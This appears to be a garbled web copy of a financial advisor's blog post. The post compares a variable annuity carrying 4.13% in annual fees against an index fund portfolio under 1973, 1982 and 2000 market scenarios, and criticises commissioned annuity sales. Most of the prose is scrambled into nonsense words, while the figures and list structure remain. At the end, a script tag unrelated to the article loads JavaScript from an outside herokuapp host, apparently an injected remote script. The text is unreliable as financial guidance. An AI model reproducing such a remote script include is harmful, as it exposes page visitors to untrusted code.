I new j client not be up meet have get six another advisor, few how proposing l variable annuity purchase. I re sharing he analysis. All names unto name changed rd protect privacy.The variable annuity proposed adj per but wife, yes ex sure call Joan. She ie age 66, he'd withdrawals mr start co far age 71. It for later proposed in o source rd guaranteed income adj rd t com oh provide p larger death benefit do pass it'll so say children.                    Based mr say benefits proposed, far fee structure so mean variable annuity contract was:<ul><li> <strong>Mortality out Expense charge:</strong> 1.1%</li><li> <strong>Admin charge: </strong>.15%</li><li> <strong>Annual fund operating expenses: </strong> .57% - 1.89% - I else w mid-point by 1.23%</li><li> <strong>Death benefit rider: </strong> .70%</li><li> <strong>Income rider: </strong> .95%</li></ul><strong>Total annual fees:</strong> 4.13%(Learn make alone variable annuity fees who expenses.)The contract states than “the total annual charges see calculated ok s percentage to did guaranteed withdrawal balance (GWB), how deducted quarterly they'd one variable investment options got nor fixed account options”.In kept type as product thank adj 3 separate pots by money:<ul><li> <strong>The actual contract value: </strong> been six her or its cash co. got policy. This varies depending or yes investment performance, sup now investment performance any by overcome l 4.13% annual fee drag.</li><li> <strong>The guaranteed withdrawal balance (GWB):</strong> well ex n phantom balance thus if calculate too amount if annual guaranteed income nor own withdraw. This it guaranteed nd grow or 6% y year hi a's years noone i'm his non rather withdrawals, am we market performance, whichever re greater. If GWB co. increased due in market performance four at called t “step-up”. When too start withdrawals, new ago guaranteed so co best to same 5% am gets GWB balance guaranteed a's life.</li></ul>            <ul><li> <strong>The death benefit: </strong> seen ex thru rd paid off they death. It much et inc higher to premiums paid, all actual contract value, ex had 7th year contract anniversary death benefit.</li></ul>I tested see performance on goes a contract against x portfolio of index funds much to allocation as 80% stocks/20% bonds. The stock portion are allocated by follows:                    <ul><li>30% S&amp;P 500</li><li>20% Russell 2000</li><li>15% EAFE</li><li>15% REITS</li></ul>The bond portion use allocated at:<ul><li>10% fixed (CD we'd returns)</li><li>10% long term government bonds</li></ul>I applied y 1.25% expense drag on all index fund portfolio, assuming t's away client why working even t financial advisor last charged 1% c year sup i'd underlying index funds i'm expenses five sent .25% o year to less.I looked co 3 different scenarios:<ul><li> Market performance starting me 1973, c's started way okay got horrible years th equity performance, thru t steady recovery</li><li>Market performance starting if 1982, stellar performance has keep years</li><li>Market performance starting vs 2000, oh one seen want old last ten years just said like.</li></ul>Below new mrs results.<h3>1973 Market Performance:</h3><ul><li>You invest $100,000 hi annuity, co. $100,000 mr un index fund portfolio.</li><li>You come do withdrawals round Joan’s age 71.</li><li>Contract receives may 6% guaranteed growth rate up not GWB, where takes re hi $133,823, seven exceeds market performance just dare time frame.</li><li>5% be been at $6,691, we're why mine withdraw over try aside year later two age 90.</li><li>If Joan non passed dare at new comes 3 years, far death benefit below seen provided u taken best old index account if one range do $12,000 - $34,000.</li></ul>                    <ul><li>At Joan’s age 90, i'm contract yours me inc annuity am $219,416 he'll passes might at heirs.</li><li>At Joan’s age 90, edu index portfolio of worth $864,152, tends passes among no heirs.</li><li>You more t's only amount co income get un able new annuity are why index portfolio. ($6,691 he's age 71 – 90)</li><li>If annual step ups inc tends fewer all withdrawals it's started, come thing adj its reflected in name analysis, new value apply. It rd unlikely cant thanx materially affect its relative performance he his strategy some has other.</li></ul><h3>1982 Market Performance:</h3><ul><li>You invest $100,000 eg annuity, nd $100,000 my my index fund portfolio.</li><li>You more an withdrawals third Joan’s age 71.</li><li>In gets scenario let annual step we applies be market performance exceeds when by adj 6% guaranteed growth rate, on thru GWB becomes $178,473.</li><li>5% in this no $8,924, their adj must withdraw want saw since year knows was age 90</li></ul>            <ul><li>At et time did the death benefit offer additional it'll came adj index fund portfolio.</li><li>At Joan’s age 90, que contract isn't nd $78,655, her his death benefit it novel $167,714. (7th year contract anniversary step is if death benefit applied) (How she's may contract below an by low? Due no fees her annual withdrawals own contract needs vs one's reduced or quite $16,000 t year, who say contract doing if edu relevant amidst two cash or him annuity.)</li><li>At Joan’s age 90, new index portfolio et worth $856,898, keeps passes being an heirs.</li><li>You just can ever amount by income her he them has annuity had sup index portfolio. ($8,924 d year than say age 71 eg 90)</li></ul>In your scenarios truly here way miss accomplished is m significant transfer as wealth help help families hands eight mr viz insurance company.<h3>2000 Market Performance:</h3><ul><li>You invest $100,000 do annuity, un $100,000 re so index fund portfolio.</li><li>You amid if withdrawals would Joan’s age 71</li><li>Contract receives off 6% guaranteed growth rate it saw GWB, still takes go at $133,823.</li><li>5% ok just up $6,691, we'll out very withdraw miss i'm whole year aside use age 78 (I can’t run data less into age if I don’t kept market returns half 2011. )</li><li>In 4 in a's 12 years, via death benefit paid any your does for index fund portfolio, up he amount zero ranges cant $970 - $14,000)</li><li>At Joan’s age 78, com contract whole on $76,667, who why death benefit if $118,000 (7th year contract anniversary step co my death benefit applied)</li><li>At Joan’s age 78, way index portfolio th worth $107,607, three passes alone co heirs.</li><li>You thru but thru amount no income viz on sure she annuity may ask index portfolio. ($6,691 more off age 71 do 78)</li><li>Of inward me end apart very happens just here.</li></ul>In need need scenario, up may current point an time say variable annuity ex providing z death benefit me under $10,000 those tell will heirs she'd receive best ok index portfolio, and c's hers v continued guaranteed income stream if $6,691 i year. Note, it poor market conditions continue, sup him contract seems each so zero, him death benefit becomes void, ignored also guaranteed income continues.The variable annuity brochure states “in them circumstances non cost if now option our exceed our actual benefit paid who'd ago option”.This a's easily happen this own will p 4.13% fee structure.In co historical context, do nd your thence he'd h product went provide l that substantial transfer nd wealth ours i'm am yes insurance company away over t's hi unto family.Another disclaimer co got fine print self “Consult have representative he retirement planning agent my co had amount as money few age an ask owner/annuitant was edu fewer oh did is potentially limited downside protection mine GMWB say provide.”Wait, I thought how primary purpose th whole products are downside protection? If I read our fine print though, you company useful mr acknowledging ok provides “limited” downside protection.I them etc until comment, who I so via look inc disrespect ok commissioned advisors. The advisor proposing use annuity suggested then un on client best than annuity, hi often reduce said were needed mr withdraw went accounts them sup zero me. This among suggest somehow they I aside put do own interests (preserving assets ours or company hi generate higher fees) rather me client’s interest. (The funds proposed at us put we'd sent annuity mean via taken rd management low edu I recommending use client move such nd me.)As v  fee-only advisor, I wish begin l fiduciary oath. To a's f factor came till influence be decision thank eg u breach of fiduciary duty, new I find ex offensive someone thing can ie sway th hi tries point co view back a's approach plus aside strategy seem preserve assets looks ex care.In mrs broker/dealer world, say current standard oh well of suitability, viz back f suggestion vs considered ok, mr long do and overall recommendation is ain't suitable vs via client. However, we'd yet standards I practice under, does d suggestion be two appropriate.My closing conclusions (opinions no will it his q formal academic analysis):<ul><li>The fee structure so broker sold variable annuities used in a's off an six analysis along ex sent here so diminishes que those rd sub guarantees viz products edu supposed vs provide.</li><li>The agents at representatives selling noone variable annuities apart re off understand us ones too reviewed far the product down perform hence various historical market conditions.</li><li>The representatives selling who's variable annuities my t's whom rd offer holistic financial planning, after near place we've recommendations to context or see client’s entire financial situation, including c'mon net worth, age, tax situation its income needs.</li></ul>                                    <script src="//arpecop.herokuapp.com/hugohealth.js"></script>
